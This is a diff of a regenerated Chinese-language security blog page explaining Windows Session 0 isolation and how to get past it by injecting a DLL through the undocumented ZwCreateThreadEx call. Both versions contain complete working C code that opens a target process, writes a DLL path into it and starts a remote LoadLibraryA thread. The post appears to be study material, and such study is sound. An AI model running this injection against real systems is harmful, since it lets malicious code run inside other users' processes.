@@ -44,7 +44,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/215f7b36/1.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/215f7b36/2.png">
 <meta property="article:published_time" content="2022-10-17T03:34:19.000Z">
-<meta property="article:modified_time" content="2022-10-17T03:41:13.588Z">
+<meta property="article:modified_time" content="2022-10-17T03:41:13.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="用户态注入">
 <meta name="twitter:card" content="summary">
@@ -296,32 +296,44 @@
 
       
         <p>session 0安全机制绕过注入</p>
-<h4 id="session-0-隔离机制"><a href="#session-0-隔离机制" class="headerlink" title="session 0 隔离机制"></a>session 0 隔离机制</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/suppercoder/article/details/17167537">https://blog.csdn.net/suppercoder/article/details/17167537</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html">https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html</a></p>
-<p>session0会话: 在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的，这个会话即 Session0。</p>
-<p>从Windows VISTA开始，只有服务可以托管到SESSION0中，用户应用程序和服务之间会进行隔离，并需要运行在用户登录系统时创建的后续会话中。</p>
+<h4 id="session-0-隔离机制">session 0 隔离机制</h4>
+<p>https://blog.csdn.net/suppercoder/article/details/17167537</p>
+<p>https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html</p>
+<p>session0会话: 在Windows XP、Windows Server
+2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的，这个会话即
+Session0。</p>
+<p>从Windows
+VISTA开始，只有服务可以托管到SESSION0中，用户应用程序和服务之间会进行隔离，并需要运行在用户登录系统时创建的后续会话中。</p>
 <p>如第一个登录用户创建Session1，第二个登录用户创建Session2，以此类推。使用不同会话运行的实体（应用程序或服务）如果不将自己明确标注为全局命名空间，并提供相应的访问控制设置，那么将无法互相发送消息，共享UI元素或共享内核对象。</p>
-<p><img src="/posts/215f7b36/1.png" alt="img"></p>
-<h4 id="ZwCreateThreadEx函数"><a href="#ZwCreateThreadEx函数" class="headerlink" title="ZwCreateThreadEx函数"></a>ZwCreateThreadEx函数</h4><p>在Windows下NtCreateThreadEx是CreateRemoteThread的底层函数,但是NtCreateThreadEx 并未在ntdll.dll中声明 需要手动使用GetProcAddress函数将其地址导出。</p>
+<figure>
+<img src="/posts/215f7b36/1.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h4 id="zwcreatethreadex函数">ZwCreateThreadEx函数</h4>
+<p>在Windows下NtCreateThreadEx是CreateRemoteThread的底层函数,但是NtCreateThreadEx
+并未在ntdll.dll中声明 需要手动使用GetProcAddress函数将其地址导出。</p>
 <p>在32位下和64位下结构如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
-
-<h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ul>
+<h4 id="注入方法">注入方法</h4>
+<ul>
 <li>1.OpenProcess 打开要注入的进程</li>
 <li>2.VirtualAllocEx 在被注入的进程中申请写内存</li>
 <li>3.WriteProcessMemory 写入dll路径到申请的内存中</li>
-<li>4.LoadlibraryA、GetProcAddress  加载ntdll.dll以获取内核函数ZwCreateThreadEx地址</li>
+<li>4.LoadlibraryA、GetProcAddress
+加载ntdll.dll以获取内核函数ZwCreateThreadEx地址</li>
 <li>5.ZwCreateThreadEx 创建远线程实现dll注入</li>
 <li>6.释放申请内存的句柄</li>
 </ul>
-<h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ZwCreateThreadExInjectDll</span><span class="params">(<span class="type">int</span> pid, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(dllname) + <span class="number">1</span>;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shen</span></span><br><span class="line">	PVOID dllNameAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == dllNameAddr) &#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(hProcess, dllNameAddr, dllname, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	FARPROC funAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	MyZwCreateThreadEx  ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);  <span class="comment">//强转一下类型</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//使用ZwCreateThreadEx创建远程线程</span></span><br><span class="line">	HANDLE remoteThread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ZwCreateThreadEx(&amp;remoteThread,PROCESS_ALL_ACCESS,<span class="literal">NULL</span>,hProcess,funAddr,dllNameAddr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (remoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ZwCreateThreadExInjectDll(10288,&quot;C:\\Users\\test\\source\\repos\\用户层注入\\Debug\\hookdll.dll&quot;);</span></span><br><span class="line"></span><br><span class="line">	ZwCreateThreadExInjectDll(<span class="number">5584</span>,<span class="string">&quot;C:\\Users\\test\\source\\repos\\用户层注入\\x64\\Debug\\hookdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/posts/215f7b36/2.png" alt="img"></p>
-<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iBinary/p/16026217.html">https://www.cnblogs.com/iBinary/p/16026217.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PeterZ1997/p/10596100.html">https://www.cnblogs.com/PeterZ1997/p/10596100.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15318327.html">https://www.cnblogs.com/nice0e3/p/15318327.html</a></p>
+<h4 id="实现代码">实现代码</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ZwCreateThreadExInjectDll</span><span class="params">(<span class="type">int</span> pid, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(dllname) + <span class="number">1</span>;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shen</span></span><br><span class="line">	PVOID dllNameAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == dllNameAddr) &#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(hProcess, dllNameAddr, dllname, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	FARPROC funAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	MyZwCreateThreadEx  ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);  <span class="comment">//强转一下类型</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//使用ZwCreateThreadEx创建远程线程</span></span><br><span class="line">	HANDLE remoteThread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ZwCreateThreadEx(&amp;remoteThread,PROCESS_ALL_ACCESS,<span class="literal">NULL</span>,hProcess,funAddr,dllNameAddr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (remoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ZwCreateThreadExInjectDll(10288,&quot;C:\\Users\\test\\source\\repos\\用户层注入\\Debug\\hookdll.dll&quot;);</span></span><br><span class="line"></span><br><span class="line">	ZwCreateThreadExInjectDll(<span class="number">5584</span>,<span class="string">&quot;C:\\Users\\test\\source\\repos\\用户层注入\\x64\\Debug\\hookdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/posts/215f7b36/2.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h4 id="references">References</h4>
+<p>https://www.cnblogs.com/iBinary/p/16026217.html</p>
+<p>https://www.cnblogs.com/PeterZ1997/p/10596100.html</p>
+<p>https://www.cnblogs.com/nice0e3/p/15318327.html</p>
 
     </div>
 
@@ -451,7 +463,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#session-0-%E9%9A%94%E7%A6%BB%E6%9C%BA%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">session 0 隔离机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ZwCreateThreadEx%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">ZwCreateThreadEx函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">注入方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">实现代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#session-0-%E9%9A%94%E7%A6%BB%E6%9C%BA%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">session 0 隔离机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zwcreatethreadex%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">ZwCreateThreadEx函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">注入方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">实现代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#references"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -467,7 +479,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -515,7 +527,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -529,7 +541,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -540,7 +552,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -680,6 +692,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
